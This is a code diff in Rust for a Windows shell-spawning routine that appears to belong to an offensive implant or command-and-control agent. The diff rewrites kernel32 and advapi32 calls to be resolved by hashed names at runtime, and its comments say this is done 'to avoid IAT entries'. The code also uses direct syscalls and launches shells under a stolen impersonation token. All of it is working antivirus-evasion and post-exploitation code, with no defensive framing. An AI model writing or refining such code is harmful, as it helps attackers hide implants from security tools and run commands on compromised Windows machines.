@@ -337,10 +337,68 @@ fn spawn_shell_process(
 ) -> Result<(PlatformProcess, PlatformPipes), String> {
     use winapi::shared::minwindef::{DWORD, FALSE, TRUE};
     use winapi::um::handleapi::INVALID_HANDLE_VALUE;
-    use winapi::um::namedpipeapi::PeekNamedPipe;
-    use winapi::um::processthreadsapi::*;
+    use winapi::um::processthreadsapi::{PROCESS_INFORMATION, STARTUPINFOW};
     use winapi::um::winbase::{CREATE_NO_WINDOW, STARTF_USESTDHANDLES, WAIT_OBJECT_0};
-    use winapi::um::winnt::{HANDLE, PROCESS_INFORMATION, STARTUPINFOW};
+    use winapi::um::winnt::HANDLE;
+
+    // Dynamically resolve kernel32 functions to avoid IAT entries.
+    let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
+        .ok_or_else(|| "could not resolve kernel32 base".to_string())?;
+
+    // CreatePipe — used for stdin/stdout/stderr pipes
+    let create_pipe_addr = pe_resolve::get_proc_address_by_hash(
+        k32,
+        pe_resolve::hash_str(b"CreatePipe\0"),
+    ).ok_or_else(|| "could not resolve CreatePipe".to_string())?;
+    type CreatePipeFn = unsafe extern "system" fn(
+        *mut winapi::shared::ntdef::HANDLE,  // hReadPipe
+        *mut winapi::shared::ntdef::HANDLE,  // hWritePipe
+        *mut winapi::um::minwinbase::SECURITY_ATTRIBUTES, // lpPipeAttributes
+        DWORD,                               // nSize
+    ) -> i32; // BOOL
+    let create_pipe: CreatePipeFn = std::mem::transmute(create_pipe_addr);
+
+    // CreateProcessW — used to spawn the shell process
+    let create_process_w_addr = pe_resolve::get_proc_address_by_hash(
+        k32,
+        pe_resolve::hash_str(b"CreateProcessW\0"),
+    ).ok_or_else(|| "could not resolve CreateProcessW".to_string())?;
+    type CreateProcessWFn = unsafe extern "system" fn(
+        *mut u16,                 // lpApplicationName
+        *mut u16,                 // lpCommandLine
+        *mut c_void,              // lpProcessAttributes
+        *mut c_void,              // lpThreadAttributes
+        i32,                      // bInheritHandles
+        u32,                      // dwCreationFlags
+        *mut c_void,              // lpEnvironment
+        *mut u16,                 // lpCurrentDirectory
+        *mut STARTUPINFOW,        // lpStartupInfo
+        *mut PROCESS_INFORMATION, // lpProcessInformation
+    ) -> i32; // BOOL
+    let create_process_w: CreateProcessWFn = std::mem::transmute(create_process_w_addr);
+
+    // CreateProcessWithTokenW — from advapi32 (no pre-computed hash)
+    let advapi32 = pe_resolve::get_module_handle_by_hash(
+        pe_resolve::hash_str(b"advapi32.dll\0")
+    ).unwrap_or(std::ptr::null_mut());
+    let create_process_with_token_w: Option<unsafe extern "system" fn(
+        *mut c_void,              // hToken
+        u32,                      // dwLogonFlags
+        *mut u16,                 // lpApplicationName
+        *mut u16,                 // lpCommandLine
+        u32,                      // dwCreationFlags
+        *mut c_void,              // lpEnvironment
+        *mut u16,                 // lpCurrentDirectory
+        *mut STARTUPINFOW,        // lpStartupInfo
+        *mut PROCESS_INFORMATION, // lpProcessInformation
+    ) -> i32> = if advapi32.is_null() {
+        None
+    } else {
+        pe_resolve::get_proc_address_by_hash(
+            advapi32,
+            pe_resolve::hash_str(b"CreateProcessWithTokenW\0"),
+        ).map(|addr| std::mem::transmute(addr))
+    };
 
     use std::ffi::OsStr;
     use std::os::windows::ffi::OsStrExt;
@@ -359,15 +417,15 @@ fn spawn_shell_process(
     sa.lpSecurityDescriptor = std::ptr::null_mut();
 
     unsafe {
-        if CreatePipe(&mut stdin_read, &mut stdin_write, &mut sa, 0) == 0 {
+        if create_pipe(&mut stdin_read, &mut stdin_write, &mut sa, 0) == 0 {
             return Err("CreatePipe(stdin) failed".to_string());
         }
-        if CreatePipe(&mut stdout_read, &mut stdout_write, &mut sa, 0) == 0 {
+        if create_pipe(&mut stdout_read, &mut stdout_write, &mut sa, 0) == 0 {
             let _ = syscall!("NtClose", stdin_read as u64);
             let _ = syscall!("NtClose", stdin_write as u64);
             return Err("CreatePipe(stdout) failed".to_string());
         }
-        if CreatePipe(&mut stderr_read, &mut stderr_write, &mut sa, 0) == 0 {
+        if create_pipe(&mut stderr_read, &mut stderr_write, &mut sa, 0) == 0 {
             let _ = syscall!("NtClose", stdin_read as u64);
             let _ = syscall!("NtClose", stdin_write as u64);
             let _ = syscall!("NtClose", stdout_read as u64);
@@ -420,13 +478,13 @@ fn spawn_shell_process(
 
     // Check if we have an impersonation token.
     let current_token = crate::token_manipulation::get_current_token();
-    let creation_result = if !current_token.is_null() {
+    let creation_result = if !current_token.is_null() && create_process_with_token_w.is_some() {
         // Use CreateProcessWithTokenW to inherit the impersonation token.
-        use winapi::um::winbase::CreateProcessWithTokenW;
         use winapi::um::winnt::LOGON_WITH_PROFILE;
+        let cpwtw = create_process_with_token_w.unwrap();
 
         let result = unsafe {
-            CreateProcessWithTokenW(
+            cpwtw(
                 current_token as *mut c_void,
                 LOGON_WITH_PROFILE,
                 std::ptr::null(),
@@ -446,7 +504,7 @@ fn spawn_shell_process(
             );
             // Fall back to CreateProcessW.
             let result = unsafe {
-                CreateProcessW(
+                create_process_w(
                     std::ptr::null(),
                     wide.as_ptr() as *mut u16,
                     std::ptr::null_mut(),
@@ -471,7 +529,7 @@ fn spawn_shell_process(
     } else {
         // No impersonation token — use CreateProcessW directly.
         let result = unsafe {
-            CreateProcessW(
+            create_process_w(
                 std::ptr::null(),
                 wide.as_ptr() as *mut u16,
                 std::ptr::null_mut(),
@@ -562,11 +620,25 @@ fn close_all_handles(
 
 #[cfg(windows)]
 fn write_to_pipe(pipes: &PlatformPipes, data: &[u8]) -> Result<(), String> {
-    use winapi::um::namedpipeapi::WriteFile;
+    // Dynamically resolve WriteFile from kernel32 to avoid IAT entry.
+    let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
+        .ok_or_else(|| "could not resolve kernel32 base".to_string())?;
+    let write_file_addr = pe_resolve::get_proc_address_by_hash(
+        k32,
+        pe_resolve::hash_str(b"WriteFile\0"),
+    ).ok_or_else(|| "could not resolve WriteFile".to_string())?;
+    type WriteFileFn = unsafe extern "system" fn(
+        winapi::shared::ntdef::HANDLE, // hFile
+        *const c_void,                 // lpBuffer
+        u32,                           // nNumberOfBytesToWrite
+        *mut u32,                      // lpNumberOfBytesWritten
+        *mut c_void,                   // lpOverlapped
+    ) -> i32; // BOOL
+    let write_file: WriteFileFn = std::mem::transmute(write_file_addr);
 
     let mut written: u32 = 0;
     let result = unsafe {
-        WriteFile(
+        write_file(
             pipes.stdin_write,
             data.as_ptr() as *const c_void,
             data.len() as u32,
@@ -585,12 +657,39 @@ fn write_to_pipe(pipes: &PlatformPipes, data: &[u8]) -> Result<(), String> {
 #[cfg(windows)]
 fn read_from_pipe(handle: winapi::shared::ntdef::HANDLE) -> Option<Vec<u8>> {
     use winapi::shared::minwindef::DWORD;
-    use winapi::um::handleapi::INVALID_HANDLE_VALUE;
-    use winapi::um::namedpipeapi::{PeekNamedPipe, ReadFile};
+
+    // Dynamically resolve PeekNamedPipe and ReadFile from kernel32 to avoid IAT entries.
+    let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
+    let peek_named_pipe_addr = pe_resolve::get_proc_address_by_hash(
+        k32,
+        pe_resolve::hash_str(b"PeekNamedPipe\0"),
+    )?;
+    type PeekNamedPipeFn = unsafe extern "system" fn(
+        winapi::shared::ntdef::HANDLE, // hNamedPipe
+        *mut c_void,                   // lpBuffer
+        u32,                           // nBufferSize
+        *mut u32,                      // lpBytesRead
+        *mut u32,                      // lpTotalBytesAvail
+        *mut u32,                      // lpBytesLeftThisMessage
+    ) -> i32; // BOOL
+    let peek_named_pipe: PeekNamedPipeFn = std::mem::transmute(peek_named_pipe_addr);
+
+    let read_file_addr = pe_resolve::get_proc_address_by_hash(
+        k32,
+        pe_resolve::hash_str(b"ReadFile\0"),
+    )?;
+    type ReadFileFn = unsafe extern "system" fn(
+        winapi::shared::ntdef::HANDLE, // hFile
+        *mut c_void,                   // lpBuffer
+        u32,                           // nNumberOfBytesToRead
+        *mut u32,                      // lpNumberOfBytesRead
+        *mut c_void,                   // lpOverlapped
+    ) -> i32; // BOOL
+    let read_file: ReadFileFn = std::mem::transmute(read_file_addr);
 
     unsafe {
         let mut bytes_avail: DWORD = 0;
-        let result = PeekNamedPipe(
+        let result = peek_named_pipe(
             handle,
             std::ptr::null_mut(),
             0,
@@ -607,7 +706,7 @@ fn read_from_pipe(handle: winapi::shared::ntdef::HANDLE) -> Option<Vec<u8>> {
         let mut buf = vec![0u8; to_read];
         let mut bytes_read: DWORD = 0;
 
-        let result = ReadFile(
+        let result = read_file(
             handle,
             buf.as_mut_ptr() as *mut c_void,
             to_read as DWORD,
